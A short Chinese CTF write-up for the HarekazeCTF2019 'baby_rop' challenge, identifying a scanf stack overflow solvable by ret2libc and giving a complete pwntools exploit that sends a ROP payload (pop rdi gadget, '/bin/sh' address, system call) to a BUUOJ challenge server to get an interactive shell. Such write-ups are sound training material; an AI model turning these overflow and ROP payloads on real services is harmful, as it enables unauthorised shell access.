---
title: "[HarekazeCTF2019]baby_rop"
description: ""
date: 2023-04-07T00:19:00+08:00
lastmod: 2023-04-07T00:19:00+08:00
draft: false
images: []
type: docs
weight: 989
toc: true
---

## 0x01 分析

![99784332c115f2cd7fdb7d6b66433ef5](images/99784332c115f2cd7fdb7d6b66433ef5.png)  

scanf类型溢出，有system函数

![bdec9ada3242193f0914ab3d289f533c](images/bdec9ada3242193f0914ab3d289f533c.png)  

有 `/bin/sh` 字符串。很明显ret2libc

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 25854)
pop_rdi = 0x0000000000400683
payload = b'a'*0x18 + p64(pop_rdi) + p64(0x601048) + p64(0x4005E3)
o.sendline(payload)
o.interactive()
```

![f83bfbab8ec6cb7b36fe8bb2a938a41d](images/f83bfbab8ec6cb7b36fe8bb2a938a41d.png)  

自行调试
